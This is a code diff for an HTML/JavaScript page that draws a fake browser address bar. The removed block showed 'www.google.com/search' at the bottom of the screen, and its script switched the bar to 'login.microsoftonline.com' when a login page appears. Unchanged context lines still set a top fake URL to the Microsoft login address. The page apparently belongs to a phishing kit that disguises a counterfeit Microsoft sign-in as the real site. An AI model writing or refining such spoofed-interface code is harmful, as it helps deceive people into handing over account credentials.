@@ -457,31 +457,6 @@
   </div>
 </div>
 
-<!-- Fake address bar at bottom (visible above keyboard) -->
-<div class="fake-bar" id="fakeBar">
-  <div class="fake-bar-content">
-    <div class="lock-icon">
-      <svg viewBox="0 0 12 12" xmlns="http://www.w3.org/2000/svg">
-        <path d="M6 1C4.9 1 4 1.9 4 3v1H3v6h6V4H8V3c0-1.1-.9-2-2-2zm0 1c.6 0 1 .4 1 1v1H5V3c0-.6.4-1 1-1z"/>
-      </svg>
-    </div>
-    <div class="fake-url" id="bottomFakeUrl">www.google.com/search</div>
-    <div class="tab-count">1</div>
-    <div class="user-icon">
-      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
-      </svg>
-    </div>
-    <div class="menu-icon">
-      <svg viewBox="0 0 4 18" xmlns="http://www.w3.org/2000/svg">
-        <circle cx="2" cy="2" r="2"/>
-        <circle cx="2" cy="9" r="2"/>
-        <circle cx="2" cy="16" r="2"/>
-      </svg>
-    </div>
-  </div>
-</div>
-
 <!-- Search Page -->
 <div class="search-page" id="searchPage">
   <header>
@@ -557,7 +532,6 @@ const loadingOverlay = document.getElementById('loadingOverlay');
 const searchPage = document.getElementById('searchPage');
 const loginPage = document.getElementById('loginPage');
 const topFakeUrl = document.getElementById('topFakeUrl');
-const bottomFakeUrl = document.getElementById('bottomFakeUrl');
 let isFullscreen = false;
 let currentPage = 'search';
 
@@ -595,7 +569,6 @@ function showLoginPage() {
   
   // Update fake URLs
   topFakeUrl.textContent = 'login.microsoftonline.com';
-  bottomFakeUrl.textContent = 'login.microsoftonline.com';
   
   // Update theme color
   changeTabColor('#ffffff');
